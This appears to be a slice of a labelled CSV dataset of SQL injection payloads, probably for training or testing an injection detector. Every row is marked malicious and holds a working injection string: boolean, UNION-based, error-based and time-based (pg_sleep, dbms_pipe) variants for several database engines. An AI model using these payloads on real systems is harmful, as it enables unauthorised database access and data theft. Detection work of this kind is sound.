row_index,payload_norm,label,sqli_type_hint
8580,"1%"" ) ) ) and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and ( ( ( ""%"" = """,1,
8581,1' ) ) ) and 9198 = 9198--,1,
8582,1' ) as rvli where 4427 = 4427,1,
8583,1' ) ) as wdor where 7426 = 7426,1,
8584,"-7016%"" ) ) union all select 8847,8847,8847--",1,
8585,"-8124 ) union all select 7251,7251,7251#",1,
8586,"1' ) ) as uvxv where 6663 = 6663 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
8587,"-8838"" ) ) as xisn where 2749 = 2749 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",1,
8588,1%' ) and 9226 = 7542--,1,
8589,"-2803' ) as jciy where 1130 = 1130 or make_set ( 4599 = 6550,6550 ) --",1,
8590,"-7258 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,
8591,"1 where 8949 = 8949 and make_set ( 8403 = 8403,8899 ) --",1,
8592,"1 ) ) ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( 3977 = 3977",1,
8593,"-3930%"" ) ) order by 1#",1,
8594,"1' and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and 'qdij' = 'qdij",1,
8595,"1%"" ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ""%"" = """,1,
8596,"1 ) ) as vzgo where 6281 = 6281 and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
8597,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual#",1,
8598,select pg_sleep ( 5 ) --,1,
8599,"1"" ) ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ""uzbl"" = ""uzbl",1,
8600,"1 where 8948 = 8948 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) --",1,
8601,"-8491"" where 9043 = 9043 union all select 9043,9043,9043,9043,9043,9043,9043,9043,9043--",1,
8602,"1' ) ) ) and exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8190 = 8190,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ( ( ( 'txwf' = 'txwf",1,
8603,1' ) ) ) and 7533 = 7533 and ( ( ( 'hoyw' = 'hoyw,1,
8604,"-1844' ) union all select 9572,9572,9572,9572#",1,
8605,"1' ) and make_set ( 9961 = 6559,6559 ) and ( 'exde' = 'exde",1,
8606,1 ) where 4780 = 4780,1,
8607,"-4811' ) ) ) union all select 4603,4603,4603,4603,4603,4603,4603,4603,4603--",1,
8608,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ""layz"" = ""layz",1,
8609,"1%"" ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ""%"" = """,1,
